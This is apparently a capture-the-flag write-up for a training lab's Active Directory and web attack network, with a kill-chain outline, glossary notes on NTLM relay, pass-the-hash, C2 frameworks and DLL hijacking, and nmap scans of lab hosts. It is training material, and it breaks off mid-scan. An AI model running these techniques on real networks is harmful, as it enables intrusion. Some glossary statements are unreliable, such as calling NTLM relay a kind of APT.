---
Holo is an Active Directory (AD) and Web-App attack lab that aims to teach core web attack vectors and more advanced AD attack techniques. This network simulates an external penetration test on a corporate network.
---

# Holo — Writeup

## Overview
### Holo — Writeup
### Holo — Writeup
![[download.png]]
### Intro Generation One
![](https://i.imgur.com/KSnkv4e.png)
Welcome to Holo!
Holo is an Active Directory and Web Application attack lab that teaches core web attack vectors and advanced\obscure Active Directory attacks along with general red teaming methodology and concepts.
In this lab, you will learn and explore the following topics:
-   .NET basics
-   Web application exploitation
-   AV evasion
-   Whitelist and container escapes
-   Pivoting
-   Operating with a C2 (Command and Control) Framework
-   Post-Exploitation
-   Situational Awareness
-   Active Directory attacks
You will learn and exploit the following attacks and misconfigurations:
-   Misconfigured sub-domains
-   Local file Inclusion
-   Remote code execution
-   Docker containers
-   SUID binaries
-   Password resets
-   Client-side filters
-   AppLocker
-   Vulnerable DLLs
-   Net-NTLMv2 / SMB
This network simulates an external penetration test on a corporate network "Hololive" with one intended kill chain. All concepts and exploits will be taught in a red teaming methodology and mindset with other methods and techniques taught throughout the network.
---
This network brings you from zero to red-team, but you are expected to have a general understanding of basic Windows and Linux architecture and the command line for both Windows and Linux. If you need help, please feel free to ask in the TryHackMe Discord; there is a channel set up for this purpose in the help section there.
```text
Situational awareness refers to the ability to understand the current state of an environment and its potential future developments, so as to identify potential risks and opportunities. This includes understanding the current state of a system, its vulnerabilities, and the potential impact of different events or actions. It is a key component of effective decision-making, risk management, and incident response, and is essential in various fields such as security, military, and emergency management.

A DLL (Dynamic Link Library) is a type of file that contains a set of instructions that other programs can use. If a DLL is found to have a vulnerability, it means that there is a weakness or flaw in the code that could potentially be exploited by an attacker. This could lead to unauthorized access or control of the system or application that is using the vulnerable DLL. It is important to keep all software and DLLs up to date in order to mitigate any known vulnerabilities.

For example, consider a DLL used by a web application to process user input. If the DLL contains a vulnerability that allows an attacker to inject malicious code into the user input, the attacker can potentially take control of the web application and steal sensitive information from the server.

Another example could be a DLL that is used by an operating system, if this DLL is vulnerable it can allow an attacker to execute code with the same rights as the operating system, which could result in total compromise of the affected system.

Net-NTLMv2 is a challenge-response authentication protocol used in various Microsoft network protocols, including SMB (Server Message Block). It is a secure version of the original NTLM protocol and is used to authenticate clients to servers in a Windows network. In SMB protocol, it is used to authenticate clients who are trying to access network resources on the server.
```
### Patching into the Matrix
Accessing the Network
To access the network, you will need to first connect to our network using OpenVPN. Here is a mini walkthrough of connecting to the Holo-specific network.
(_Please note the browser-based machine will not be able to access these machines. If you want to use the browser-based machine, deploy it and run your OpenVPN configuration on the browser Kali machine)_
Answer the questions below
_Go to your [access](https://tryhackme.com/access) page. Select ‘Holo’ from the VPN servers (under the network tab) and download your configuration file._
![](https://i.imgur.com/GSArkVu.png)
Completed
Use an OpenVPN client to connect. This example shows the client on [Linux](https://tryhackme.com/access#pills-linux), use this guide to connect using [Windows](https://tryhackme.com/access#pills-windows) or [MacOS](https://tryhackme.com/access#pills-macos)
![](https://assets.tryhackme.com/additional/hololive/ben2.png)
_Change "ben.ovpn" to your config file_
When you run this you see lots of text, at the end, it will say “Initialization Sequence Completed”
Completed
Return to your access page. You can verify you are connected by looking on your access page. Refresh the page. You should see a green tick next to Connected. It will also show you your internal IP address.
![](https://assets.tryhackme.com/additional/hololive/status.png)
_You’re now ready to start hacking the Holo Network!_
Completed
Alternatively, you can download your network OpenVPN configuration file (as shown in step 1), deploy a browser-based Kali machine from your [My Machine page](https://tryhackme.com/my-machine), and follow the steps on that Linux machine.
Completed
### Kill Chain
[Overview and Background Section]
[Task 1] Generation 1 - An Overview of Holo
[Task 2] Patching Into the Matrix  - Get Connected!
[Task 3] Kill Chain - Well, you're already here
[Task 4] Flag Submission Panel - Submit your flags here
[Exploitation Guide]
[Task 8] and [Task 11]  - Enumerating Files and Subdomains found on L-SRV01
[Task 11] and [Task 12] Exploiting RCE and LFI vulnerabilities found on L-SRV01
[Task 14] Enumerating a Docker container
[Task 15] Enumerating the Docker host from L-SRV02
[Task 16] through [Task 18] Gaining RCE on L-SRV01
[Task 19] L-SRV01 Privilege Escalation
[Task 22] Pivoting into the rest of the 10.200.x.0/24 network
[Task 27] Exploiting password reset tokens on S-SRV01
[Task 28] Bypassing file upload restrictions on S-SRV01
[Task 35] Dumping Credentials on S-SRV01
[Task 36] Passing the Hash to PC-FILESRV01
[Task 37] Bypassing AppLocker on PC-FILESRV01
[Task 42] and [Task 43] DLL Hijacking on PC-FILESRV01
[Task 46] Preform a Remote NTLM Relay attack on PC-FILESRV01 to DC-SRV01
[Task 47] Looting, submitting the final flags from S-SRV02, and Thank You's.
[Learning Guide]
[Task 8] Punk Rock 101 err Web App 101 - Fuzzing for Files and  Subdomains using GoBuster
[Task 9] What the Fuzz? - Fuzzing for Files and Subdomains using WFuzz
[Task 11] What is this? Vulnversity? - Web Exploitation Basics, LFI and RCE
[Task 15] Living of the LANd - Building your own Portable Port Scanner!
[Task 17] Making Thin Lizzy Proud - Docker Enumeration and RCE via MySQL
[Task 22] Digging a tunnel to nowhere - An overview of Pivoting with Chisel and SSHuttle
[Task 23] Command your Foes and Control your Friends - Installing and Setting up Covenant C2
[Task 27] Hide yo' Kids, Hide yo' Wives, Hide yo' Tokens - Password Reset Tokens - [Grindr Case Study](https://hackernoon.com/grindrs-reset-token-vulnerability-a-technical-deep-dive-5u1t3zdl)
[Task 28] Thanks, I'll let myself in - Exploiting Client Side scripts
[Task 28] Basically a joke itself... - AV Bypass
[Task 35] That's not a cat, that's a dawg - Gaining Persistece and Dumping Credentials with Mimikat ft. Covenant
[Task 36] Good Intentions, Courtesy of Microsoft Part: II - Hash spraying with CrackMapExec
[Task 37] Watson left her locker open - An Intro to AppLocker Bypass
[Task 42] and [Task 43] WE'RE TAKING OVER THIS DLL! - DLL Hijacking
[Task 44] Never Trust LanMan - Understanding how NetNTLM Sessions are established
[Task 45] No you see me, now you dont - Real World Case Study, How Spooks pwned a network in 5 minutes using Responder and NTLMRelayX
[Task 46] Why not just turn it off? - Showcasing a new AD Attack vector; Hijacking Windows' SMB server
Answer the questions below
Read the above task to gain an understanding of the attack path in Holo
Completed
```text
NTLM relay is a type of cyber attack that occurs when an attacker is able to intercept and forward NTLM authentication requests to a remote server, allowing them to gain unauthorized access to the target system. This type of attack is often accomplished by exploiting a vulnerability in the SMB protocol, which is used for file and printer sharing in Windows networks. The goal of a remote NTLM relay attack is to gain access to sensitive information or to take control of a target system. It is a type of advanced persistent threat (APT) and it is important to have proper security measures in place to detect and prevent it.

NTLM (NT LAN Manager) es un protocolo de seguridad desarrollado por Microsoft que proporciona autenticación y autorización para redes basadas en Windows. Es utilizado para autenticar a los usuarios en un dominio de Active Directory y proporciona seguridad mediante el cifrado de las contraseñas. Un ejemplo de su uso es cuando un usuario intenta acceder a un recurso compartido en un servidor de Windows, el servidor utiliza NTLM para autenticar al usuario y permitir o denegar el acceso al recurso compartido.

"Chisel" and "SSHuttle" are tools that can be used for network pivoting. Pivoting refers to the technique of using an initial foothold on a network to gain access to further systems and resources.

Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. It allows you to create a reverse tunnel, which can be used to bypass firewalls and access internal networks. An example of using Chisel is to create a reverse tunnel from a compromised machine to a machine controlled by an attacker, allowing the attacker to access the internal network of the compromised machine.

SSHuttle is a transparent proxy server that works as a poor man's VPN. It allows you to forward all traffic of a subnet over an SSH connection. An example of using SSHuttle is to forward all traffic of a subnet in a compromised machine over an SSH connection to a machine controlled by an attacker, allowing the attacker to access the internal network of the compromised machine.

Covenant is an open-source .NET post-exploitation agent that is typically used for red team operations. It is a C2 (Command and Control) framework that allows an attacker to interact with infected machines in a way that allows them to maintain persistence and move laterally through a network. The Covenant C2 framework allows an attacker to perform a variety of tasks, such as keylogging, screenshotting, and process execution, as well as exfiltrating data from an infected machine. The C2 server is typically run on a command and control infrastructure owned by the attacker, with the client-side implants running on the target machines. The communication between the C2 server and the client-side implant is typically done over HTTP, HTTPS, or DNS.

LanMan is a password-based authentication protocol used in older versions of Microsoft Windows operating systems. It is considered to be less secure than newer authentication protocols such as NTLM and Kerberos. LanMan uses a two-part, case-insensitive, 14-character password for authentication, which makes it vulnerable to brute force attacks. It was replaced by NTLM in Windows NT and later systems.

NetNTLM Sessions refers to the process of authenticating a user on a Windows-based network using the NetNTLM protocol. This protocol is used for authentication between a Windows client and a Windows server and is commonly used for network logins, file and printer sharing, and other network-based services. The process of NetNTLM Sessions can be captured using tools such as Wireshark, and can be used to detect and analyze network-based attacks such as pass-the-hash and relay attacks.

Pass-the-hash (PtH) is a method of authenticating to a system or service using the underlying NTLM or LanMan hash of a user's password, instead of the plaintext password. This method can be used to authenticate to a remote server or service, even if the user's plaintext password is not known. The technique can be used to compromise the security of a network by allowing an attacker to move laterally through the network and access resources that they should not have access to. This can be done by stealing the NTLM or LanMan hash of a user's password from the network, then using the hash to authenticate to other systems or services.

CrackMapExec (CME) is a tool that allows you to perform various network reconnaissance and exploitation tasks, including hash spraying. Hash spraying is a technique used to identify weak or easily guessable passwords by repeatedly trying a list of known or commonly used password hashes against a target network. CME automates this process by allowing you to specify a target network, a list of password hashes, and various options for performing the attack. Once the attack is launched, CME will attempt to authenticate to various network resources using the specified hashes, and will report any successful authentications. This technique can be used to identify weak or easily guessable passwords, and potentially gain unauthorized access to network resources. It's important to note that the use of this technique may be illegal or against the terms of service of the targeted organization.

DLL hijacking is a type of attack in which an attacker tricks a program into loading a malicious DLL (dynamic-link library) file instead of the intended DLL file. This can occur when a program looks for a DLL in a location that is controlled by an attacker, such as a current working directory or a location specified in the PATH environment variable. Once the malicious DLL is loaded, it can execute arbitrary code, allowing the attacker to gain control of the affected system. This type of attack is possible because many Windows programs do not properly validate the DLLs they load, and instead rely on the operating system to find the correct DLL file.

DLL stands for Dynamic Link Library. It is a type of file that contains a collection of functions and data that can be used by multiple programs at the same time. DLL files are often written in programming languages such as C++ or C#, but they can be written in any programming language that can create a Windows-compatible binary. A DLL file is used by an executable file to perform specific tasks, and it can be loaded at runtime by the executable. This allows multiple programs to use the same code and data, which can save memory and disk space. When a program needs to use a function in a DLL, it loads the DLL into memory and calls the function.

DLL (Dynamic Link Library) es un tipo de archivo de sistema que contiene código reutilizable y recursos, como imágenes, sonidos, y funciones de programación, que pueden ser utilizadas por varios programas al mismo tiempo. Un ejemplo de cómo se utiliza una DLL es cuando varias aplicaciones comparten la misma función de impresión, en lugar de tener código duplicado en cada aplicación, la función de impresión se coloca en una DLL y todas las aplicaciones la llaman desde allí.

"DLL Hijacking" es una técnica de explotación de seguridad en la que un atacante aprovecha una vulnerabilidad en la manera en la que una aplicación busca y carga una DLL específica para ejecutar código malicioso en el sistema objetivo. Este ataque se lleva a cabo mediante la colocación de una DLL maliciosa en un lugar específico donde la aplicación buscará y cargará automáticamente, en lugar de la DLL legítima.
```

## Enumeration
Before we get too overzealous in attacking web servers and hacking the world, we need to identify our scope and perform some initial recon to identify assets. Your trusted agent has informed you that the scope of the engagement is 10.200.x.0/24 and 192.168.100.0/24. To begin the assessment, you can scan the ranges provided and identify any public-facing infrastructure to obtain a foothold.
Nmap is a commonly used port scanning tool that is an industry-standard that is fast, reliable, and comes with NSE scripts. Nmap also supports CIDR notation, so we can specify a /24 notation to scan 254 hosts. There are many various arguments and scripts that you can use along with Nmap; however, we will only be focusing on a few outlined below.
-   `sV` scans for service and version
-   `sC` runs a script scan against open ports.
-   `-p-` scans all ports 0 - 65535
-   `-v` provides verbose output
Syntax: `nmap -sV -sC -p- -v 10.200.x.0/24`
Once you have identified open machines on the network and basic ports open, you can go back over the devices again individually with a more aggressive scan such as using the `-A` argument.
For more information about Nmap, we suggest completing the [nmap](https://tryhackme.com/room/furthernmap) room on Tryhackme.
Answer the questions below
```text
The last octet refers to the last 8 bits or 1 byte of an IP address. In an IPv4 address, the last octet represents the number assigned to the individual host on a network. An example of a last octet in an IP address is 192.168.1.100, where 100 is the last octet.
```
```text
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -p- -v 10.200.108.0/24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 12:47 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:47
Completed NSE at 12:47, 0.00s elapsed
Initiating NSE at 12:47
Completed NSE at 12:47, 0.00s elapsed
Initiating NSE at 12:47
Completed NSE at 12:47, 0.00s elapsed
Initiating Ping Scan at 12:47
Scanning 256 hosts [2 ports/host]
Completed Ping Scan at 12:47, 12.84s elapsed (256 total hosts)
Initiating Parallel DNS resolution of 2 hosts. at 12:47
Completed Parallel DNS resolution of 2 hosts. at 12:47, 0.01s elapsed
Nmap scan report for 10.200.108.0 [host down]
Nmap scan report for 10.200.108.1 [host down]
Nmap scan report for 10.200.108.2 [host down]
Nmap scan report for 10.200.108.3 [host down]
Nmap scan report for 10.200.108.4 [host down]
Nmap scan report for 10.200.108.5 [host down]
Nmap scan report for 10.200.108.6 [host down]
Nmap scan report for 10.200.108.7 [host down]
Nmap scan report for 10.200.108.8 [host down]
Nmap scan report for 10.200.108.9 [host down]
Nmap scan report for 10.200.108.10 [host down]
Nmap scan report for 10.200.108.11 [host down]
Nmap scan report for 10.200.108.12 [host down]
Nmap scan report for 10.200.108.13 [host down]
Nmap scan report for 10.200.108.14 [host down]
Nmap scan report for 10.200.108.15 [host down]
Nmap scan report for 10.200.108.16 [host down]
Nmap scan report for 10.200.108.17 [host down]
Nmap scan report for 10.200.108.18 [host down]
Nmap scan report for 10.200.108.19 [host down]
Nmap scan report for 10.200.108.20 [host down]
Nmap scan report for 10.200.108.21 [host down]
Nmap scan report for 10.200.108.22 [host down]
Nmap scan report for 10.200.108.23 [host down]
Nmap scan report for 10.200.108.24 [host down]
Nmap scan report for 10.200.108.25 [host down]
Nmap scan report for 10.200.108.26 [host down]
Nmap scan report for 10.200.108.27 [host down]
Nmap scan report for 10.200.108.28 [host down]
Nmap scan report for 10.200.108.29 [host down]
Nmap scan report for 10.200.108.30 [host down]
Nmap scan report for 10.200.108.31 [host down]
Nmap scan report for 10.200.108.32 [host down]
Nmap scan report for 10.200.108.34 [host down]
Nmap scan report for 10.200.108.35 [host down]
Nmap scan report for 10.200.108.36 [host down]
Nmap scan report for 10.200.108.37 [host down]
Nmap scan report for 10.200.108.38 [host down]
Nmap scan report for 10.200.108.39 [host down]
Nmap scan report for 10.200.108.40 [host down]
Nmap scan report for 10.200.108.41 [host down]
Nmap scan report for 10.200.108.42 [host down]
Nmap scan report for 10.200.108.43 [host down]
Nmap scan report for 10.200.108.44 [host down]
Nmap scan report for 10.200.108.45 [host down]
Nmap scan report for 10.200.108.46 [host down]
Nmap scan report for 10.200.108.47 [host down]
Nmap scan report for 10.200.108.48 [host down]
Nmap scan report for 10.200.108.49 [host down]
Nmap scan report for 10.200.108.50 [host down]
Nmap scan report for 10.200.108.51 [host down]
Nmap scan report for 10.200.108.52 [host down]
Nmap scan report for 10.200.108.53 [host down]
Nmap scan report for 10.200.108.54 [host down]
Nmap scan report for 10.200.108.55 [host down]
Nmap scan report for 10.200.108.56 [host down]
Nmap scan report for 10.200.108.57 [host down]
Nmap scan report for 10.200.108.58 [host down]
Nmap scan report for 10.200.108.59 [host down]
Nmap scan report for 10.200.108.60 [host down]
Nmap scan report for 10.200.108.61 [host down]
Nmap scan report for 10.200.108.62 [host down]
Nmap scan report for 10.200.108.63 [host down]
Nmap scan report for 10.200.108.64 [host down]
Nmap scan report for 10.200.108.65 [host down]
Nmap scan report for 10.200.108.66 [host down]
Nmap scan report for 10.200.108.67 [host down]
Nmap scan report for 10.200.108.68 [host down]
Nmap scan report for 10.200.108.69 [host down]
Nmap scan report for 10.200.108.70 [host down]
Nmap scan report for 10.200.108.71 [host down]
Nmap scan report for 10.200.108.72 [host down]
Nmap scan report for 10.200.108.73 [host down]
Nmap scan report for 10.200.108.74 [host down]
Nmap scan report for 10.200.108.75 [host down]
Nmap scan report for 10.200.108.76 [host down]
Nmap scan report for 10.200.108.77 [host down]
Nmap scan report for 10.200.108.78 [host down]
Nmap scan report for 10.200.108.79 [host down]
Nmap scan report for 10.200.108.80 [host down]
Nmap scan report for 10.200.108.81 [host down]
Nmap scan report for 10.200.108.82 [host down]
Nmap scan report for 10.200.108.83 [host down]
Nmap scan report for 10.200.108.84 [host down]
Nmap scan report for 10.200.108.85 [host down]
Nmap scan report for 10.200.108.86 [host down]
Nmap scan report for 10.200.108.87 [host down]
Nmap scan report for 10.200.108.88 [host down]
Nmap scan report for 10.200.108.89 [host down]
Nmap scan report for 10.200.108.90 [host down]
Nmap scan report for 10.200.108.91 [host down]
Nmap scan report for 10.200.108.92 [host down]
Nmap scan report for 10.200.108.93 [host down]
Nmap scan report for 10.200.108.94 [host down]
Nmap scan report for 10.200.108.95 [host down]
Nmap scan report for 10.200.108.96 [host down]
Nmap scan report for 10.200.108.97 [host down]
Nmap scan report for 10.200.108.98 [host down]
Nmap scan report for 10.200.108.99 [host down]
Nmap scan report for 10.200.108.100 [host down]
Nmap scan report for 10.200.108.101 [host down]
Nmap scan report for 10.200.108.102 [host down]
Nmap scan report for 10.200.108.103 [host down]
Nmap scan report for 10.200.108.104 [host down]
Nmap scan report for 10.200.108.105 [host down]
Nmap scan report for 10.200.108.106 [host down]
Nmap scan report for 10.200.108.107 [host down]
Nmap scan report for 10.200.108.108 [host down]
Nmap scan report for 10.200.108.109 [host down]
Nmap scan report for 10.200.108.110 [host down]
Nmap scan report for 10.200.108.111 [host down]
Nmap scan report for 10.200.108.112 [host down]
Nmap scan report for 10.200.108.113 [host down]
Nmap scan report for 10.200.108.114 [host down]
Nmap scan report for 10.200.108.115 [host down]
Nmap scan report for 10.200.108.116 [host down]
Nmap scan report for 10.200.108.117 [host down]
Nmap scan report for 10.200.108.118 [host down]
Nmap scan report for 10.200.108.119 [host down]
Nmap scan report for 10.200.108.120 [host down]
Nmap scan report for 10.200.108.121 [host down]
Nmap scan report for 10.200.108.122 [host down]
Nmap scan report for 10.200.108.123 [host down]
Nmap scan report for 10.200.108.124 [host down]
Nmap scan report for 10.200.108.125 [host down]
Nmap scan report for 10.200.108.126 [host down]
Nmap scan report for 10.200.108.127 [host down]
Nmap scan report for 10.200.108.128 [host down]
Nmap scan report for 10.200.108.129 [host down]
Nmap scan report for 10.200.108.130 [host down]
Nmap scan report for 10.200.108.131 [host down]
Nmap scan report for 10.200.108.132 [host down]
Nmap scan report for 10.200.108.133 [host down]
Nmap scan report for 10.200.108.134 [host down]
Nmap scan report for 10.200.108.135 [host down]
Nmap scan report for 10.200.108.136 [host down]
Nmap scan report for 10.200.108.137 [host down]
Nmap scan report for 10.200.108.138 [host down]
Nmap scan report for 10.200.108.139 [host down]
Nmap scan report for 10.200.108.140 [host down]
Nmap scan report for 10.200.108.141 [host down]
Nmap scan report for 10.200.108.142 [host down]
Nmap scan report for 10.200.108.143 [host down]
Nmap scan report for 10.200.108.144 [host down]
Nmap scan report for 10.200.108.145 [host down]
Nmap scan report for 10.200.108.146 [host down]
Nmap scan report for 10.200.108.147 [host down]
Nmap scan report for 10.200.108.148 [host down]
Nmap scan report for 10.200.108.149 [host down]
Nmap scan report for 10.200.108.150 [host down]
Nmap scan report for 10.200.108.151 [host down]
Nmap scan report for 10.200.108.152 [host down]
Nmap scan report for 10.200.108.153 [host down]
Nmap scan report for 10.200.108.154 [host down]
Nmap scan report for 10.200.108.155 [host down]
Nmap scan report for 10.200.108.156 [host down]
Nmap scan report for 10.200.108.157 [host down]
Nmap scan report for 10.200.108.158 [host down]
Nmap scan report for 10.200.108.159 [host down]
Nmap scan report for 10.200.108.160 [host down]
Nmap scan report for 10.200.108.161 [host down]
Nmap scan report for 10.200.108.162 [host down]
Nmap scan report for 10.200.108.163 [host down]
Nmap scan report for 10.200.108.164 [host down]
Nmap scan report for 10.200.108.165 [host down]
Nmap scan report for 10.200.108.166 [host down]
Nmap scan report for 10.200.108.167 [host down]
Nmap scan report for 10.200.108.168 [host down]
Nmap scan report for 10.200.108.169 [host down]
Nmap scan report for 10.200.108.170 [host down]
Nmap scan report for 10.200.108.171 [host down]
Nmap scan report for 10.200.108.172 [host down]
Nmap scan report for 10.200.108.173 [host down]
Nmap scan report for 10.200.108.174 [host down]
Nmap scan report for 10.200.108.175 [host down]
Nmap scan report for 10.200.108.176 [host down]
Nmap scan report for 10.200.108.177 [host down]
Nmap scan report for 10.200.108.178 [host down]
Nmap scan report for 10.200.108.179 [host down]
Nmap scan report for 10.200.108.180 [host down]
Nmap scan report for 10.200.108.181 [host down]
Nmap scan report for 10.200.108.182 [host down]
Nmap scan report for 10.200.108.183 [host down]
Nmap scan report for 10.200.108.184 [host down]
Nmap scan report for 10.200.108.185 [host down]
Nmap scan report for 10.200.108.186 [host down]
Nmap scan report for 10.200.108.187 [host down]
Nmap scan report for 10.200.108.188 [host down]
Nmap scan report for 10.200.108.189 [host down]
Nmap scan report for 10.200.108.190 [host down]
Nmap scan report for 10.200.108.191 [host down]
Nmap scan report for 10.200.108.192 [host down]
Nmap scan report for 10.200.108.193 [host down]
Nmap scan report for 10.200.108.194 [host down]
Nmap scan report for 10.200.108.195 [host down]
Nmap scan report for 10.200.108.196 [host down]
Nmap scan report for 10.200.108.197 [host down]
Nmap scan report for 10.200.108.198 [host down]
Nmap scan report for 10.200.108.199 [host down]
Nmap scan report for 10.200.108.200 [host down]
Nmap scan report for 10.200.108.201 [host down]
Nmap scan report for 10.200.108.202 [host down]
Nmap scan report for 10.200.108.203 [host down]
Nmap scan report for 10.200.108.204 [host down]
Nmap scan report for 10.200.108.205 [host down]
Nmap scan report for 10.200.108.206 [host down]
Nmap scan report for 10.200.108.207 [host down]
Nmap scan report for 10.200.108.208 [host down]
Nmap scan report for 10.200.108.209 [host down]
Nmap scan report for 10.200.108.210 [host down]
Nmap scan report for 10.200.108.211 [host down]
Nmap scan report for 10.200.108.212 [host down]
Nmap scan report for 10.200.108.213 [host down]
Nmap scan report for 10.200.108.214 [host down]
Nmap scan report for 10.200.108.215 [host down]
Nmap scan report for 10.200.108.216 [host down]
Nmap scan report for 10.200.108.217 [host down]
Nmap scan report for 10.200.108.218 [host down]
Nmap scan report for 10.200.108.219 [host down]
Nmap scan report for 10.200.108.220 [host down]
Nmap scan report for 10.200.108.221 [host down]
Nmap scan report for 10.200.108.222 [host down]
Nmap scan report for 10.200.108.223 [host down]
Nmap scan report for 10.200.108.224 [host down]
Nmap scan report for 10.200.108.225 [host down]
Nmap scan report for 10.200.108.226 [host down]
Nmap scan report for 10.200.108.227 [host down]
Nmap scan report for 10.200.108.228 [host down]
Nmap scan report for 10.200.108.229 [host down]
Nmap scan report for 10.200.108.230 [host down]
Nmap scan report for 10.200.108.231 [host down]
Nmap scan report for 10.200.108.232 [host down]
Nmap scan report for 10.200.108.233 [host down]
Nmap scan report for 10.200.108.234 [host down]
Nmap scan report for 10.200.108.235 [host down]
Nmap scan report for 10.200.108.236 [host down]
Nmap scan report for 10.200.108.237 [host down]
Nmap scan report for 10.200.108.238 [host down]
Nmap scan report for 10.200.108.239 [host down]
Nmap scan report for 10.200.108.240 [host down]
Nmap scan report for 10.200.108.241 [host down]
Nmap scan report for 10.200.108.242 [host down]
Nmap scan report for 10.200.108.243 [host down]
Nmap scan report for 10.200.108.244 [host down]
Nmap scan report for 10.200.108.245 [host down]
Nmap scan report for 10.200.108.246 [host down]
Nmap scan report for 10.200.108.247 [host down]
Nmap scan report for 10.200.108.248 [host down]
Nmap scan report for 10.200.108.249 [host down]
Nmap scan report for 10.200.108.251 [host down]
Nmap scan report for 10.200.108.252 [host down]
Nmap scan report for 10.200.108.253 [host down]
Nmap scan report for 10.200.108.254 [host down]
Nmap scan report for 10.200.108.255 [host down]
Initiating Connect Scan at 12:47
Scanning 2 hosts [65535 ports/host]
Discovered open port 22/tcp on 10.200.108.250
Discovered open port 22/tcp on 10.200.108.33
Discovered open port 80/tcp on 10.200.108.33
Connect Scan Timing: About 2.16% done; ETC: 13:11 (0:23:22 remaining)
Increasing send delay for 10.200.108.250 from 0 to 5 due to max_successful_tryno increase to 4
Connect Scan Timing: About 3.67% done; ETC: 13:15 (0:26:40 remaining)
Increasing send delay for 10.200.108.33 from 0 to 5 due to max_successful_tryno increase to 4
Connect Scan Timing: About 4.98% done; ETC: 13:18 (0:28:55 remaining)
Connect Scan Timing: About 8.32% done; ETC: 13:21 (0:30:28 remaining)
Discovered open port 1337/tcp on 10.200.108.250
Connect Scan Timing: About 17.76% done; ETC: 13:22 (0:28:47 remaining)
Increasing send delay for 10.200.108.33 from 5 to 10 due to max_successful_tryno increase to 5
Discovered open port 33060/tcp on 10.200.108.33
```
```text
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -A -p22,1337 -v 10.200.108.250
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 13:15 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:15
Completed NSE at 13:15, 0.00s elapsed
Initiating NSE at 13:15
Completed NSE at 13:15, 0.00s elapsed
Initiating NSE at 13:15
Completed NSE at 13:15, 0.00s elapsed
Initiating Ping Scan at 13:15
Scanning 10.200.108.250 [2 ports]
Completed Ping Scan at 13:15, 0.30s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:15
Completed Parallel DNS resolution of 1 host. at 13:15, 0.09s elapsed
Initiating Connect Scan at 13:15
Scanning 10.200.108.250 [2 ports]
Discovered open port 22/tcp on 10.200.108.250
Discovered open port 1337/tcp on 10.200.108.250
Completed Connect Scan at 13:15, 0.31s elapsed (2 total ports)
Initiating Service scan at 13:15
Scanning 2 services on 10.200.108.250
Completed Service scan at 13:16, 11.83s elapsed (2 services on 1 host)
NSE: Script scanning 10.200.108.250.
Initiating NSE at 13:16
Completed NSE at 13:16, 6.33s elapsed
Initiating NSE at 13:16
Completed NSE at 13:16, 0.81s elapsed
Initiating NSE at 13:16
Completed NSE at 13:16, 0.00s elapsed
Nmap scan report for 10.200.108.250
Host is up (0.30s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ddc7ace2a2713939c40bfa8dbec49cf9 (RSA)
|   256 4bdb806ee249a0e165d784a6ae658a94 (ECDSA)
|_  256 885a24b8eaf8679b1f9cc772fcdc2185 (ED25519)
1337/tcp open  http    Node.js Express framework
|_http-title: Error
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 13:16
Completed NSE at 13:16, 0.00s elapsed
Initiating NSE at 13:16
Completed NSE at 13:16, 0.00s elapsed
Initiating NSE at 13:16
Completed NSE at 13:16, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.94 seconds
```
```text
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -A -p22,80,33060 -v 10.200.108.33
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 13:18 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:18
Completed NSE at 13:18, 0.00s elapsed
Initiating NSE at 13:18
Completed NSE at 13:18, 0.00s elapsed
Initiating NSE at 13:18
Completed NSE at 13:18, 0.00s elapsed
Initiating Ping Scan at 13:18
Scanning 10.200.108.33 [2 ports]
Completed Ping Scan at 13:18, 0.29s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:18
Completed Parallel DNS resolution of 1 host. at 13:18, 0.10s elapsed
Initiating Connect Scan at 13:18
Scanning 10.200.108.33 [3 ports]
Discovered open port 80/tcp on 10.200.108.33
Discovered open port 22/tcp on 10.200.108.33
Discovered open port 33060/tcp on 10.200.108.33
Completed Connect Scan at 13:18, 0.31s elapsed (3 total ports)
Initiating Service scan at 13:18
Scanning 3 services on 10.200.108.33
Completed Service scan at 13:19, 33.81s elapsed (3 services on 1 host)
NSE: Script scanning 10.200.108.33.
Initiating NSE at 13:19
Completed NSE at 13:19, 7.86s elapsed
Initiating NSE at 13:19
Completed NSE at 13:19, 1.21s elapsed
Initiating NSE at 13:19
Completed NSE at 13:19, 0.00s elapsed
Nmap scan report for 10.200.108.33
Host is up (0.30s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2ca35465d3bcdd11f7848fd071d4cfbd (RSA)
|   256 f6169fb8f65dc3797e47a8fe96c4d292 (ECDSA)
|_  256 847a107c0c7a8eed8f33cdc3410b8052 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: holo.live
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 5.5.3
| http-robots.txt: 21 disallowed entries (15 shown)
| /var/www/wordpress/index.php 
| /var/www/wordpress/readme.html /var/www/wordpress/wp-activate.php 
| /var/www/wordpress/wp-blog-header.php /var/www/wordpress/wp-config.php 
| /var/www/wordpress/wp-content /var/www/wordpress/wp-includes 
| /var/www/wordpress/wp-load.php /var/www/wordpress/wp-mail.php 
| /var/www/wordpress/wp-signup.php /var/www/wordpress/xmlrpc.php 
| /var/www/wordpress/license.txt /var/www/wordpress/upgrade 
|_/var/www/wordpress/wp-admin /var/www/wordpress/wp-comments-post.php
33060/tcp open  mysqlx?
| fingerprint-strings: 
